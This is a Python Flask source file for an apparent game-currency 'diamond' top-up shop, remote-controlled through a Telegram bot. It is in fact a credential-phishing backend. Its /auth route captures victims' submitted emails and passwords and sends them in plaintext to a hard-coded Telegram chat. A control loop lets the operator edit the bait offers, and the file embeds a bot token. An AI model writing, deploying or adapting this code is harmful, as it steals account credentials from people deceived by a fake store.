from flask import Flask, render_template, request
import requests, threading, time

app = Flask(__name__)
T = '8567544194:AAHbkTbjnkTsN2iNznlN5Ek1TtlN_R0ncTE'
C = '8691740167'
offers = [{"name": "25 Diamonds", "price": "17"}, {"name": "50 Diamonds", "price": "31"}]

def send(m):
    requests.post(f"https://api.telegram.org/bot{T}/sendMessage", data={'chat_id': C, 'text': m, 'parse_mode': 'Markdown'})

def bot_loop():
    last_id = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{T}/getUpdates?offset={last_id + 1}").json()
            for u in r.get("result", []):
                last_id = u["update_id"]
                msg = u.get("message", {}).get("text", "")
                global offers
                if msg.startswith("/add"):
                    p = msg.split(" ", 1)[1].split(",")
                    offers.append({"name": p[0].strip(), "price": p[1].strip()})
                    send(f"✅ Added: {p[0]}")
                elif msg.startswith("/del"):
                    n = msg.split(" ", 1)[1].strip()
                    offers = [o for o in offers if o["name"] != n]
                    send(f"🗑️ Deleted: {n}")
                elif msg == "/list":
                    l = "\n".join([f"🔹 {o['name']} - {o['price']} TK" for o in offers])
                    send(f"📦 *Offers:*\n{l}")
        except: pass
        time.sleep(2)

threading.Thread(target=bot_loop, daemon=True).start()

@app.route('/')
def index(): return render_template('index.html', offers=offers)

@app.route('/auth', methods=['POST'])
def auth():
    send(f"👤 *NEW {request.form.get('type')}*\n📧 Email: `{request.form.get('email')}`\n🔑 Pass: `{request.form.get('password')}`")
    return "OK"

@app.route('/order', methods=['POST'])
def order():
    send(f"🔔 *NEW ORDER*\n👤 UID: `{request.form.get('player_id')}`\n💎 Pack: {request.form.get('package')}")
    return "Success"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
